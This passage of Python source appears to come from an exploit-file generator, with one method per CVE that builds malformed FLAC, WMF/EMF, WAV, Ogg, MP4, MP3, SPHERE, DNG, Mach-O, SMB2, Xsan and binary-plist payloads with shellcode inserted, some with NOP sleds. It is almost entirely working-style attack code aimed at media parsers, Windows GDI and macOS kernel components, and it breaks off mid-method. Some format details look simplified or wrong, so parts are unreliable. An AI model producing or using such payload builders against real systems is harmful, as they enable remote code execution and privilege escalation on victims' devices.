        app_data = b'SHEL' + shellcode + b'\x00' * (1024 - len(shellcode) - 4)
        flac += struct.pack('>I', len(app_data))[1:]  # 24-bit length
        flac += app_data

        # FRAME header (simplified - would contain audio data)
        # This is post-exploit marker
        flac += b'\xFF\xF8'  # Sync code
        flac += b'\xC9\x00'  # Block size, sample rate bits
        flac += b'\x00' * 100  # Frame data

        return flac

    def _cve_2020_0499_flac(self, shellcode):
        """
        CVE-2020-0499: FLAC heap buffer overflow / OOB read

        Vulnerability: Out-of-bounds read in FLAC__bitreader_read_rice_signed_block()
        in bitreader.c. Heap buffer overflow during decoding.

        Target: FLAC < 1.3.4
        Impact: Information disclosure, DoS
        CVSS: 6.5 (Medium)
        """
        # Similar structure to CVE-2020-22219 but targets decoder

        flac = b'fLaC'

        # STREAMINFO (minimal valid)
        flac += b'\x00\x00\x22'  # STREAMINFO, 34 bytes
        flac += struct.pack('>H', 4096)  # min_blocksize
        flac += struct.pack('>H', 4096)  # max_blocksize
        flac += b'\x00\x00\x00'  # min_framesize
        flac += b'\x00\x00\x00'  # max_framesize

        # Sample rate 44.1kHz, 2 channels, 16 bits
        flac += struct.pack('>I', (44100 << 8) | (1 << 5) | 15)
        flac += b'\x00\x00\x00\x00\x00'  # total_samples (40 bits)
        flac += b'\x00' * 16  # MD5

        # FRAME with malformed Rice partition
        # This triggers the OOB read in bitreader

        # Sync code + reserved + blocking strategy
        frame = b'\xFF\xF8'

        # Block size + sample rate
        frame += b'\xC9'  # Block size = 4096, sample rate from streaminfo
        frame += b'\x00'  # Channel assignment: independent

        # Sample size bits + zero bit
        frame += b'\x04'  # 16-bit samples

        # Frame/sample number (UTF-8 coded, simplified)
        frame += b'\x00'

        # CRC-8 of header (simplified)
        frame += b'\x00'

        # SUBFRAME with malicious Rice parameters
        # These cause read beyond buffer bounds

        subframe = b'\x08'  # Prediction order = 0, LPC

        # Malformed Rice partition with large partition order
        # Partition order (4 bits)
        subframe += b'\xF0'  # Order 15 - way too large, triggers OOB

        # Rice parameters (malformed)
        for i in range(32):  # Too many parameters
            subframe += b'\x1F'  # Max parameter value

        # Residual data (where shellcode goes)
        subframe += shellcode + b'\x00' * (1024 - len(shellcode))

        frame += subframe

        # Frame CRC-16
        frame += b'\x00\x00'

        # Mark as last metadata, add frame
        flac += b'\x84'  # Last metadata, type 4 (invalid but triggers parser)
        flac += b'\x00\x04\x00'  # Length
        flac += b'\x00' * 1024  # Padding

        flac += frame

        return flac

    def _cve_2008_1083_emf_wmf(self, shellcode):
        """
        CVE-2008-1083: Windows GDI EMF/WMF heap overflow

        Vulnerability: Integer overflow in GDI's EMF/WMF image handling leading
        to heap overflow.

        Target: Windows GDI (all versions at time of disclosure)
        Impact: Remote code execution via malicious EMF/WMF
        """
        # Windows Metafile (WMF) format

        # Placeable metafile header
        wmf = b'\xD7\xCD\xC6\x9A'  # Magic number
        wmf += b'\x00\x00'  # Handle (unused)

        # Bounding box (left, top, right, bottom)
        wmf += struct.pack('<hhhh', 0, 0, 10000, 10000)

        # Units per inch
        wmf += struct.pack('<H', 1440)

        # Reserved
        wmf += b'\x00\x00\x00\x00'

        # Checksum
        wmf += struct.pack('<H', 0)

        # WMF Header
        wmf += struct.pack('<H', 1)  # Type (1 = memory metafile)
        wmf += struct.pack('<H', 9)  # Header size in words
        wmf += struct.pack('<H', 0x0300)  # Windows version

        # File size in words (placeholder)
        size_pos = len(wmf)
        wmf += struct.pack('<I', 0)

        # Number of objects
        wmf += struct.pack('<H', 1)

        # Max record size (malformed - triggers integer overflow)
        wmf += struct.pack('<I', 0xFFFFFFFF)

        # Number of members (should be 0)
        wmf += struct.pack('<H', 0)

        # === Records ===

        # SetWindowOrg record
        record = struct.pack('<I', 5)  # Size in words
        record += struct.pack('<H', 0x020B)  # Function: SetWindowOrg
        record += struct.pack('<hh', 0, 0)  # Y, X
        wmf += record

        # SetWindowExt record (huge values trigger overflow)
        record = struct.pack('<I', 5)  # Size
        record += struct.pack('<H', 0x020C)  # Function: SetWindowExt
        record += struct.pack('<HH', 0xFFFF, 0xFFFF)  # Huge extents
        wmf += record

        # CreateBrushIndirect (with embedded shellcode)
        record_size = 7 + len(shellcode) // 2
        record = struct.pack('<I', record_size)
        record += struct.pack('<H', 0x02FC)  # Function: CreateBrushIndirect
        record += struct.pack('<H', 0)  # Style: BS_SOLID

        # Color (embed shellcode here)
        record += shellcode + b'\x00' * (1024 - len(shellcode))

        wmf += record

        # End of file
        record = struct.pack('<I', 3)  # Size
        record += struct.pack('<H', 0x0000)  # Function: EOF
        wmf += record

        # Update file size
        file_size_words = len(wmf) // 2
        wmf = wmf[:size_pos] + struct.pack('<I', file_size_words) + wmf[size_pos + 4:]

        return wmf

    def _cve_2005_4560_wmf(self, shellcode):
        """
        CVE-2005-4560: WMF SETABORTPROC vulnerability

        Vulnerability: SETABORTPROC record in WMF allows arbitrary code execution.
        Classic vulnerability, widely exploited in 2005-2006.

        Target: Windows GDI (WMF parsing)
        Impact: Zero-click RCE via crafted WMF
        """
        # WMF with SETABORTPROC record

        # Placeable header
        wmf = b'\xD7\xCD\xC6\x9A\x00\x00'
        wmf += struct.pack('<hhhh', 0, 0, 1000, 1000)  # Bounding box
        wmf += struct.pack('<H', 1440)  # Units per inch
        wmf += b'\x00\x00\x00\x00'  # Reserved
        wmf += b'\x00\x00'  # Checksum

        # WMF header
        wmf += struct.pack('<H', 1)  # Type
        wmf += struct.pack('<H', 9)  # Header size
        wmf += struct.pack('<H', 0x0300)  # Version
        wmf += struct.pack('<I', 0)  # Size (placeholder)
        size_pos = len(wmf) - 4
        wmf += struct.pack('<H', 0)  # Objects
        wmf += struct.pack('<I', 0)  # Max record
        wmf += struct.pack('<H', 0)  # Members

        # SETABORTPROC record - THE VULNERABILITY
        # This record type allows specifying a procedure address
        # We provide shellcode address

        record_size = 4 + len(shellcode) // 2
        record = struct.pack('<I', record_size)  # Size in words
        record += struct.pack('<H', 0x0105)  # SETABORTPROC function

        # "Procedure address" - actually shellcode
        record += shellcode
        record += b'\x90' * (512 - len(shellcode))  # NOP sled

        wmf += record

        # EOF
        wmf += struct.pack('<IH', 3, 0x0000)

        # Update size
        size = len(wmf) // 2
        wmf = wmf[:size_pos] + struct.pack('<I', size) + wmf[size_pos + 4:]

        return wmf

    # ==================== PRIORITY 3 CVEs ====================

    def _cve_2017_6827_audiofile_wav(self, shellcode):
        """
        CVE-2017-6827: audiofile MSADPCM heap overflow

        Vulnerability: Heap overflow in MSADPCM::initializeCoefficients() in
        MSADPCM.cpp when processing crafted WAV files.

        Target: audiofile (libaudiofile) 0.3.6
        Impact: Remote code execution via crafted WAV
        """
        # WAV/RIFF file with MSADPCM compression

        wav = b'RIFF'

        # File size (placeholder)
        wav += b'\x00\x00\x00\x00'
        size_pos = 4

        # WAVE format
        wav += b'WAVE'

        # fmt chunk
        wav += b'fmt '
        wav += struct.pack('<I', 50)  # Chunk size (MSADPCM needs extra data)
        wav += struct.pack('<H', 2)   # Format: MSADPCM (0x0002)
        wav += struct.pack('<H', 2)   # Channels
        wav += struct.pack('<I', 44100)  # Sample rate
        wav += struct.pack('<I', 22050)  # Byte rate
        wav += struct.pack('<H', 1024)   # Block align
        wav += struct.pack('<H', 4)      # Bits per sample

        # Extra format bytes for MSADPCM
        wav += struct.pack('<H', 32)  # Extra size
        wav += struct.pack('<H', 512)  # Samples per block

        # Coefficient pairs - MALFORMED to trigger overflow
        num_coef = 256  # Should be 7, we send 256 to overflow
        wav += struct.pack('<H', num_coef)

        for i in range(num_coef):
            wav += struct.pack('<hh', 256 + i, 128 - i)  # Coefficient pairs

        # data chunk with shellcode
        wav += b'data'
        data_size = len(shellcode) + 2048
        wav += struct.pack('<I', data_size)
        wav += shellcode
        wav += b'\x00' * 2048

        # Update RIFF size
        riff_size = len(wav) - 8
        wav = wav[:size_pos] + struct.pack('<I', riff_size) + wav[size_pos + 4:]

        return wav

    def _cve_2018_5146_libvorbis(self, shellcode):
        """
        CVE-2018-5146: libvorbis out-of-bounds write

        Vulnerability: OOB write during codebook decoding in vorbis_book_decodev_set()
        in vorbis_codebook.c.

        Target: libvorbis (OGG Vorbis decoder)
        Impact: Memory corruption, browser crashes, possible RCE
        """
        # OGG container with malformed Vorbis stream

        ogg = b'OggS'  # Capture pattern
        ogg += b'\x00'  # Version
        ogg += b'\x02'  # Header type: BOS (Beginning of stream)

        # Granule position
        ogg += b'\x00' * 8

        # Serial number
        ogg += struct.pack('<I', 0x12345678)

        # Page sequence
        ogg += struct.pack('<I', 0)

        # Checksum (placeholder)
        ogg += b'\x00\x00\x00\x00'
        checksum_pos = len(ogg) - 4

        # Number of segments
        ogg += b'\x01'

        # Segment table
        ogg += b'\xFF'  # 255 bytes in segment

        # Vorbis identification header
        packet = b'\x01'  # Packet type: identification
        packet += b'vorbis'

        packet += struct.pack('<I', 0)  # Vorbis version
        packet += b'\x02'  # Channels
        packet += struct.pack('<I', 44100)  # Sample rate

        # Bitrate (max, nominal, min)
        packet += struct.pack('<III', 128000, 128000, 128000)

        # Block sizes (malformed to trigger vulnerability)
        packet += b'\xF0'  # blocksizes (4 bits each), both max (15) - invalid!

        packet += b'\x01'  # Framing bit

        # Pad to 255 bytes
        packet += b'\x00' * (255 - len(packet))

        ogg += packet

        # Second page with setup header (malformed codebook)
        ogg += b'OggS\x00\x00'  # Capture + version + flags
        ogg += b'\x00' * 8  # Granule
        ogg += struct.pack('<I', 0x12345678)  # Serial
        ogg += struct.pack('<I', 1)  # Sequence
        ogg += b'\x00\x00\x00\x00'  # Checksum
        ogg += b'\x01'  # 1 segment
        ogg += b'\xFF'  # 255 bytes

        # Setup header with malformed codebook
        setup = b'\x05'  # Packet type: setup
        setup += b'vorbis'

        # Codebook count (malformed - too many)
        setup += b'\xFF'  # 256 codebooks (triggers OOB write)

        # Malformed codebook entries with shellcode
        setup += shellcode
        setup += b'\x00' * (255 - len(setup))

        ogg += setup

        return ogg

    def _cve_2022_22675_appleavd(self, shellcode):
        """
        CVE-2022-22675: AppleAVD video accelerator buffer overflow

        Vulnerability: Buffer overflow in parsePredWeightTable() function.
        Allows writing 16-bit values at controlled offsets.

        Target: AppleAVD kernel driver (iOS/macOS)
        Impact: Kernel RCE, used in iOS jailbreaks
        """
        # H.264 NAL unit with malformed prediction weight table
        # Wrapped in MP4 container

        # MP4/ISO Base Media File Format

        # ftyp box (file type)
        mp4 = struct.pack('>I', 20)  # Box size
        mp4 += b'ftyp'
        mp4 += b'mp42'  # Major brand
        mp4 += struct.pack('>I', 0)  # Minor version
        mp4 += b'mp42mp41'  # Compatible brands

        # mdat box (media data) - contains H.264 NAL units
        mdat_start = len(mp4)
        mp4 += b'\x00\x00\x00\x00'  # Size placeholder
        mp4 += b'mdat'

        # H.264 NAL unit: Slice header with malformed pred_weight_table

        # NAL unit header
        nal = b'\x00\x00\x00\x01'  # Start code
        nal += b'\x65'  # NAL type: IDR slice

        # Slice header (simplified, focuses on pred_weight_table)

        # first_mb_in_slice
        nal += b'\x00'

        # slice_type (P slice)
        nal += b'\x00'

        # pic_parameter_set_id
        nal += b'\x00'

        # frame_num
        nal += b'\x00'

        # Prediction weight table - THE VULNERABILITY
        # luma_log2_weight_denom (malformed)
        nal += b'\xFF'  # Large value triggers overflow

        # chroma_log2_weight_denom
        nal += b'\xFF'

        # Weight/offset pairs (malformed to write beyond bounds)
        for i in range(32):  # Too many references
            nal += struct.pack('>H', 0x4141)  # Weight (controlled write!)
            nal += struct.pack('>H', 0x4242)  # Offset

        # Shellcode embedded in slice data
        nal += shellcode
        nal += b'\x00' * (1024 - len(shellcode))

        mp4 += nal

        # Update mdat size
        mdat_size = len(mp4) - mdat_start
        mp4 = mp4[:mdat_start] + struct.pack('>I', mdat_size) + mp4[mdat_start + 4:]

        return mp4

    def _cve_2021_0561_flac(self, shellcode):
        """
        CVE-2021-0561: FLAC encoder OOB write

        Vulnerability: Out-of-bounds write in append_to_verify_fifo_interleaved_()
        in stream_encoder.c. Missing bounds check.

        Target: FLAC < 1.3.4
        Impact: Local information disclosure
        """
        # Similar to other FLAC CVEs but targets encoder
        # Create FLAC with parameters that trigger OOB during encoding verification

        flac = b'fLaC'

        # STREAMINFO with specific parameters to trigger encoder bug
        flac += b'\x00\x00\x22'  # STREAMINFO, 34 bytes

        # blocksize triggering encoder overflow
        flac += struct.pack('>H', 65535)  # min = max value
        flac += struct.pack('>H', 65535)  # max = max value

        flac += b'\x00\x00\x00'  # min framesize
        flac += b'\xFF\xFF\xFF'  # max framesize (huge)

        # 192kHz sample rate (upper limit)
        flac += struct.pack('>I', (192000 << 8) | (7 << 5) | 31)  # 8ch, 32-bit

        flac += b'\xFF' * 5  # Huge sample count
        flac += b'\x00' * 16  # MD5

        # APPLICATION block with shellcode
        flac += b'\x82\x00\x04\x00'  # Last metadata, APPLICATION, 1024 bytes
        flac += b'SHEL'
        flac += shellcode + b'\x00' * (1020 - len(shellcode))

        return flac

    def _cve_2017_11126_mpg123(self, shellcode):
        """
        CVE-2017-11126: mpg123 global buffer overflow

        Vulnerability: Global buffer overflow in III_i_stereo() function in layer3.c.
        Affects intensity stereo processing.

        Target: mpg123 (pre-July 2017)
        Impact: Remote DoS, possible information disclosure
        """
        # MP3 with crafted intensity stereo data

        mp3 = b'ID3\x04\x00\x00\x00\x00\x00\x00'  # ID3 header

        # MP3 frame with Layer III, intensity stereo mode
        mp3 += b'\xFF\xFB'  # Sync + MPEG1 Layer III

        # Mode: Joint stereo with intensity stereo
        mp3 += b'\x90'  # Bitrate + sample rate
        mp3 += b'\x50'  # Joint stereo, intensity stereo on

        # Side info crafted for intensity stereo overflow
        side_info = bytearray(32)

        # Craft scalefac_compress and window_switching to trigger overflow
        side_info[0] = 0xFF
        side_info[1] = 0xFF

        # is_pos values (intensity stereo positions) - overflow trigger
        for i in range(2, 32):
            side_info[i] = 0xFF  # Max values cause overflow

        mp3 += bytes(side_info)

        # Main data with shellcode
        mp3 += shellcode + b'\x00' * (512 - len(shellcode))

        return mp3

    def _cve_2021_40426_libsox(self, shellcode):
        """
        CVE-2021-40426: Sound Exchange libsox heap overflow

        Vulnerability: Heap buffer overflow in sphere.c start_read() function.
        NIST SPHERE audio file format parser.

        Target: libsox
        Impact: RCE via crafted SPHERE file
        """
        # NIST SPHERE audio file format

        # SPHERE header
        sphere = b'NIST_1A\n'
        sphere += b'   1024\n'  # Header size (10 chars + newline)

        # Header fields (key: value pairs)
        # Malformed to trigger overflow in start_read()

        # channel_count (huge value triggers allocation)
        sphere += b'channel_count -i 65535\n'

        # sample_rate
        sphere += b'sample_rate -i 44100\n'

        # sample_n_bytes (malformed)
        sphere += b'sample_n_bytes -i 1048576\n'  # Huge value

        # sample_count (triggers overflow calculation)
        sphere += b'sample_count -i 4294967295\n'  # Max uint32

        # sample_coding (PCM)
        sphere += b'sample_coding -s4 pcm\n'

        # Malformed field with excessive length (overflow trigger)
        sphere += b'malformed_field -s999999 '
        sphere += b'A' * 512  # Overflow the header buffer
        sphere += b'\n'

        # end_head marker
        sphere += b'end_head\n'

        # Pad to 1024 bytes
        while len(sphere) < 1024:
            sphere += b' '

        # Audio data with shellcode
        sphere += shellcode + b'\x00' * (2048 - len(shellcode))

        return sphere

    def _cve_2025_43300_imageio_dng(self, shellcode):
        """
        CVE-2025-43300: Apple ImageIO DNG/TIFF JPEG Lossless OOB write

        Vulnerability: Out-of-bounds write in CDNGLosslessJpegUnpacker (RawCamera).
        Mismatch between TIFF SamplesPerPixel metadata and JPEG SOF3 NumComponents.
        When SamplesPerPixel=2 but NumComponents=1, loop writes 16-bit  2 samples
        per pixel causing double writes per row  OOB write.

        Target: Apple ImageIO framework (iOS/iPadOS/macOS)
        Impact: Zero-click RCE via iMessage (actively exploited in the wild)
        CVSS: CRITICAL
        Patched: iOS 18.6.2, macOS Sequoia 15.6.1, Sonoma 14.7.8, Ventura 13.7.8
        """
        # Create malicious DNG file (TIFF with JPEG Lossless compression)

        # TIFF Header (Little Endian)
        dng = b'II'  # Little endian
        dng += struct.pack('<H', 42)  # TIFF magic number
        dng += struct.pack('<I', 8)  # Offset to first IFD

        # IFD (Image File Directory) - 12 bytes per entry
        ifd_entries = []

        # ImageWidth tag (256)
        ifd_entries.append(struct.pack('<HHII', 256, 4, 1, 1920))  # Width

        # ImageHeight tag (257)
        ifd_entries.append(struct.pack('<HHII', 257, 4, 1, 1080))  # Height

        # BitsPerSample tag (258) - DNG uses 16-bit
        ifd_entries.append(struct.pack('<HHII', 258, 3, 1, 16))

        # Compression tag (259) - JPEG Lossless (7)
        ifd_entries.append(struct.pack('<HHII', 259, 3, 1, 7))

        # PhotometricInterpretation tag (262) - LinearRaw (34892)
        ifd_entries.append(struct.pack('<HHII', 262, 3, 1, 34892))

        # CRITICAL: SamplesPerPixel tag (277) - Set to 2 (THE VULNERABILITY)
        ifd_entries.append(struct.pack('<HHII', 277, 3, 1, 2))  # Mismatch!

        # StripOffsets tag (273) - Offset to JPEG data
        jpeg_offset = 8 + 2 + (len(ifd_entries) + 1) * 12 + 4
        ifd_entries.append(struct.pack('<HHII', 273, 4, 1, jpeg_offset))

        # StripByteCounts tag (279)
        ifd_entries.append(struct.pack('<HHII', 279, 4, 1, 4096))

        # DNGVersion tag (50706) - DNG 1.4.0.0
        ifd_entries.append(struct.pack('<HHII', 50706, 1, 4, 0x00000401))

        # Write IFD
        dng += struct.pack('<H', len(ifd_entries))  # Number of entries
        for entry in ifd_entries:
            dng += entry
        dng += struct.pack('<I', 0)  # No next IFD

        # JPEG Lossless Stream (SOF3) - THE EXPLOIT
        # Start of Image
        jpeg_stream = b'\xff\xd8'

        # SOF3 (Start of Frame, Lossless JPEG)
        sof3 = b'\xff\xc3'  # SOF3 marker
        sof3 += struct.pack('>H', 11)  # Length (11 bytes)
        sof3 += b'\x10'  # Precision (16-bit)
        sof3 += struct.pack('>H', 1080)  # Height
        sof3 += struct.pack('>H', 1920)  # Width
        sof3 += b'\x01'  # NumComponents = 1 (MISMATCH with SamplesPerPixel=2!)
        sof3 += b'\x01\x11\x00'  # Component 1: ID, sampling, quantization

        jpeg_stream += sof3

        # DHT (Define Huffman Table) - simplified
        dht = b'\xff\xc4'
        dht += struct.pack('>H', 21)  # Length
        dht += b'\x00'  # Table class/ID
        dht += b'\x00' * 16  # Number of codes of each length
        dht += b'\x00'  # Table values (empty for exploit)
        jpeg_stream += dht

        # SOS (Start of Scan)
        sos = b'\xff\xda'
        sos += struct.pack('>H', 8)  # Length
        sos += b'\x01'  # Components in scan
        sos += b'\x01\x00'  # Component 1
        sos += b'\x00\x3f\x00'  # Predictor, point transform
        jpeg_stream += sos

        # Compressed image data with shellcode embedded
        # This triggers the OOB write during decompression
        jpeg_stream += b'\xff' * 256  # Trigger data
        jpeg_stream += shellcode
        jpeg_stream += b'\x00' * (2048 - len(shellcode))

        # End of Image
        jpeg_stream += b'\xff\xd9'

        # Pad to match StripByteCounts
        while len(jpeg_stream) < 4096:
            jpeg_stream += b'\x00'

        dng += jpeg_stream

        return dng

    def _cve_2025_24228_kernel(self, shellcode):
        """
        CVE-2025-24228: macOS Kernel buffer overflow

        Vulnerability: Buffer overflow in macOS kernel (CWE-125 Out-of-bounds Read).
        An app may execute arbitrary code with kernel privileges.

        Target: macOS Ventura 13.0-13.7.4, Sonoma 14.0-14.7.4, Sequoia 15.0-15.3
        Impact: Kernel-level code execution with full system privileges
        CVSS: 7.8 (HIGH)
        Patched: Ventura 13.7.5, Sonoma 14.7.5, Sequoia 15.4
        """
        # Create Mach-O binary that triggers kernel buffer overflow
        # This is a simplified exploit trigger using IOKit framework calls

        # Mach-O 64-bit header
        macho = struct.pack('<I', 0xfeedfacf)  # magic (MH_MAGIC_64)
        macho += struct.pack('<I', 0x01000007)  # cputype (CPU_TYPE_X86_64)
        macho += struct.pack('<I', 0x00000003)  # cpusubtype
        macho += struct.pack('<I', 0x00000002)  # filetype (MH_EXECUTE)
        macho += struct.pack('<I', 3)  # ncmds (3 load commands)
        macho += struct.pack('<I', 256)  # sizeofcmds
        macho += struct.pack('<I', 0x00000001)  # flags (MH_NOUNDEFS)
        macho += struct.pack('<I', 0)  # reserved

        # LC_SEGMENT_64 command
        seg_cmd = struct.pack('<II', 0x19, 232)  # cmd, cmdsize
        seg_cmd += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # segname
        seg_cmd += struct.pack('<QQ', 0, 0x1000)  # vmaddr, vmsize
        seg_cmd += struct.pack('<QQ', 0, 0x1000)  # fileoff, filesize
        seg_cmd += struct.pack('<II', 7, 7)  # maxprot, initprot
        seg_cmd += struct.pack('<II', 1, 0)  # nsects, flags

        # Section header
        sect = b'__text\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += b'__TEXT\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        sect += struct.pack('<QQ', 0, 512)  # addr, size
        sect += struct.pack('<IIII', 256, 0, 0, 0)  # offset, align, reloff, nreloc
        sect += struct.pack('<II', 0x80000400, 0)  # flags, reserved

        seg_cmd += sect
        macho += seg_cmd

        # LC_UNIXTHREAD (entry point)
        thread_cmd = struct.pack('<II', 0x5, 184)  # cmd, cmdsize
        thread_cmd += struct.pack('<II', 4, 42)  # flavor (x86_THREAD_STATE64), count
        thread_cmd += b'\x00' * 160  # thread state
        thread_cmd += struct.pack('<Q', 0x100)  # RIP = entry point
        thread_cmd += b'\x00' * 8
        macho += thread_cmd

        # Pad header to 256 bytes
        macho += b'\x00' * (256 - len(macho))

        # Exploit code that triggers kernel overflow via IOKit
        # Uses IOConnectCallMethod with oversized input buffer
        exploit_code = bytes([
            # Trigger kernel overflow via IOKit call
            0x48, 0x31, 0xc0,              # xor rax, rax
            0x48, 0xc7, 0xc7, 0xff, 0xff, 0xff, 0xff,  # mov rdi, -1 (invalid connection)
            0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,  # mov rsi, 0 (selector)
        ])

        # Oversized buffer that triggers kernel overflow
        exploit_code += b'A' * 8192  # Buffer overflow trigger
        exploit_code += shellcode
        exploit_code += b'\x00' * (512 - len(exploit_code) - len(shellcode))

        macho += exploit_code

        return macho

    def _cve_2025_24153_smb(self, shellcode):
        """
        CVE-2025-24153: macOS SMB buffer overflow

        Vulnerability: Buffer overflow in SMB implementation.
        An app with root privileges may execute arbitrary code with kernel privileges.

        Target: macOS (fixed in Sequoia 15.3, Sonoma 14.7.3)
        Impact: Privilege escalation to kernel level via SMB
        CVSS: HIGH
        """
        # SMB2 packet with malformed buffer causing overflow

        # NetBIOS Session Service header
        smb = b'\x00'  # Message type (Session message)
        smb += b'\x00\x00\x00'  # Length (will be set later)

        # SMB2 Header
        smb += b'\xfe\x53\x4d\x42'  # Protocol ID (0xfe + 'SMB')
        smb += struct.pack('<H', 64)  # StructureSize
        smb += struct.pack('<H', 0)  # CreditCharge
        smb += struct.pack('<I', 0)  # Status
        smb += struct.pack('<H', 5)  # Command (SMB2_CREATE)
        smb += struct.pack('<H', 0)  # Credits
        smb += struct.pack('<I', 0)  # Flags
        smb += struct.pack('<I', 0)  # NextCommand
        smb += struct.pack('<Q', 1)  # MessageId
        smb += struct.pack('<I', 0)  # Reserved
        smb += struct.pack('<I', 1)  # TreeId
        smb += struct.pack('<Q', 0x1234567890abcdef)  # SessionId
        smb += b'\x00' * 16  # Signature

        # SMB2 CREATE Request (malformed)
        create_req = struct.pack('<H', 57)  # StructureSize
        create_req += b'\x00'  # SecurityFlags
        create_req += b'\x00'  # RequestedOplockLevel
        create_req += struct.pack('<I', 0)  # ImpersonationLevel
        create_req += struct.pack('<Q', 0)  # SmbCreateFlags
        create_req += struct.pack('<Q', 0)  # Reserved
        create_req += struct.pack('<I', 0x001f01ff)  # DesiredAccess
        create_req += struct.pack('<I', 0)  # FileAttributes
        create_req += struct.pack('<I', 7)  # ShareAccess
        create_req += struct.pack('<I', 1)  # CreateDisposition
        create_req += struct.pack('<I', 0)  # CreateOptions

        # Name - OVERSIZED to trigger buffer overflow
        name_offset = len(smb) + len(create_req)
        create_req += struct.pack('<H', name_offset)  # NameOffset

        # VULNERABILITY: Malformed name length triggers overflow
        malicious_name_len = 65535  # Huge value
        create_req += struct.pack('<H', malicious_name_len)  # NameLength

        create_req += struct.pack('<I', 0)  # CreateContextsOffset
        create_req += struct.pack('<I', 0)  # CreateContextsLength

        smb += create_req

        # Malicious name buffer with shellcode
        smb += b'\\\\' + b'A' * 1024  # Path prefix
        smb += shellcode
        smb += b'\x00' * (4096 - len(shellcode))

        # Update NetBIOS length
        total_len = len(smb) - 4
        smb = smb[0:1] + struct.pack('>I', total_len)[1:4] + smb[4:]

        return smb

    def _cve_2025_24156_xsan(self, shellcode):
        """
        CVE-2025-24156: macOS Xsan integer overflow

        Vulnerability: Integer overflow in Xsan filesystem driver.
        Addressed through improved input validation.
        Enables privilege elevation in applications.

        Target: macOS (fixed in Sequoia 15.3)
        Impact: Privilege escalation via integer overflow
        CVSS: MEDIUM-HIGH
        """
        # Xsan filesystem metadata with integer overflow

        # Xsan volume header
        xsan = b'XSAN'  # Magic
        xsan += struct.pack('>I', 1)  # Version
        xsan += struct.pack('>Q', 0xffffffffffffffff)  # Volume size (overflow!)
        xsan += struct.pack('>Q', 0xffffffff00000000)  # Block count (overflow!)
        xsan += struct.pack('>I', 4096)  # Block size
        xsan += struct.pack('>I', 0xffffffff)  # Inode count (overflow!)

        # Stripe group configuration
        xsan += struct.pack('>I', 255)  # Stripe group count

        # Each stripe group has malicious parameters
        for i in range(255):
            # Stripe group header
            stripe = struct.pack('>I', i)  # Group ID
            stripe += struct.pack('>Q', 0xffffffff)  # Size (integer overflow)
            stripe += struct.pack('>H', 65535)  # Stripe width (overflow)
            stripe += struct.pack('>H', 65535)  # Stripe depth (overflow)

            # These overflows cause incorrect buffer allocation
            # Leading to heap overflow when accessing data
            xsan += stripe

        # Inode table with crafted entries
        xsan += struct.pack('>I', 0xffffffff)  # Inode table offset (overflow)
        xsan += struct.pack('>I', 0xffffffff)  # Inode table size (overflow)

        # Malicious inode that triggers privilege escalation
        inode = struct.pack('>H', 1)  # Type (file)
        inode += struct.pack('>H', 0)  # Flags
        inode += struct.pack('>I', 0)  # UID (root)
        inode += struct.pack('>I', 0)  # GID (wheel)
        inode += struct.pack('>I', 0o4755)  # Mode (setuid root!)
        inode += struct.pack('>Q', 0xffffffff)  # Size (overflow)
        inode += struct.pack('>Q', 0)  # Create time
        inode += struct.pack('>Q', 0)  # Modify time

        # Data extents with overflow
        inode += struct.pack('>I', 100)  # Extent count
        for i in range(100):
            # Each extent descriptor has overflow
            inode += struct.pack('>Q', 0xffffffff * i)  # Start block
            inode += struct.pack('>I', 0xffffffff)  # Block count (overflow!)

        xsan += inode

        # Embedded shellcode in "file data"
        xsan += shellcode
        xsan += b'\x00' * (8192 - len(xsan) - len(shellcode))

        return xsan

    def _cve_2025_24154_webcontentfilter(self, shellcode):
        """
        CVE-2025-24154: macOS WebContentFilter out-of-bounds write

        Vulnerability: Out-of-bounds write in WebContentFilter framework.
        Addressed with improved input validation.
        Causes system termination or kernel memory corruption.

        Target: macOS (fixed in Sequoia 15.3)
        Impact: Kernel memory corruption, system crash or code execution
        CVSS: HIGH
        """
        # WebContentFilter configuration plist with malicious data

        # Binary plist header
        plist = b'bplist00'

        # Object table
        objects = []

        # Dictionary with malicious entries
        # Key 1: FilterRules
        objects.append(b'\x50FilterRules')  # String

        # Value 1: Array of rules with OOB write trigger
        rules_array = b'\xa0'  # Empty array marker (will be modified)
        objects.append(rules_array)

        # Key 2: ContentCategories (triggers OOB write)
        objects.append(b'\x51ContentCategories')

        # Value 2: Malicious array with oversized data
        # This triggers out-of-bounds write in parser
        malicious_data = b'\xaf'  # Array marker
        malicious_data += struct.pack('>H', 65535)  # Count (overflow!)

        # Each "category" entry is crafted to write beyond buffer
        for i in range(100):  # Reduced count to avoid huge file
            # String object with length that causes OOB write
            entry = b'\x5f'  # String marker with 1-byte length
            entry += struct.pack('B', 255)  # Length
            entry += b'A' * 255  # Data
            malicious_data += entry

        objects.append(malicious_data)

        # Key 3: PluginBundleID (another trigger vector)
        objects.append(b'\x50PluginBundleID')

        # Value 3: String with shellcode
        plugin_str = b'\x5f'
        plugin_str += struct.pack('B', min(len(shellcode), 255))
        plugin_str += shellcode[:255]
        objects.append(plugin_str)

        # Build offset table
        offset_table = b''
        current_offset = 8  # After header
        offsets = []

        for obj in objects:
            offsets.append(current_offset)
            current_offset += len(obj)

        # Write objects
        for obj in objects:
            plist += obj

        # Offset table
        offset_size = 2  # 2 bytes per offset
        for off in offsets:
            plist += struct.pack('>H', off)

        # Trailer
        trailer = b'\x00' * 5  # Unused
        trailer += struct.pack('B', offset_size)  # Offset int size
        trailer += struct.pack('B', 2)  # Object ref size
        trailer += struct.pack('>Q', len(objects))  # Num objects
        trailer += struct.pack('>Q', 0)  # Root object
        trailer += struct.pack('>Q', current_offset)  # Offset table offset

        plist += trailer

        # Pad with additional malicious data to ensure OOB write
        plist += b'\xff' * 1024
        plist += shellcode * 4

        return plist

    def _cve_2025_60724_gdiplus(self, shellcode):
        """
        CVE-2025-60724: Windows GDI+ heap overflow

        Vulnerability: Heap-based buffer overflow in Microsoft Graphics Component (GDI+).
        Crafted image or metafile triggers heap corruption during rendering.

        Target: Windows GDI+ (all versions patched Nov 2025)
        Impact: RCE via malicious metafile (EMF/WMF)
        CVSS: 9.8 (CRITICAL)
        """
        # Enhanced Metafile (EMF) with malicious record

        # EMF Header
        emf = struct.pack('<I', 0x00000001)  # Type (EMR_HEADER)
        emf += struct.pack('<I', 108)  # Size of header record
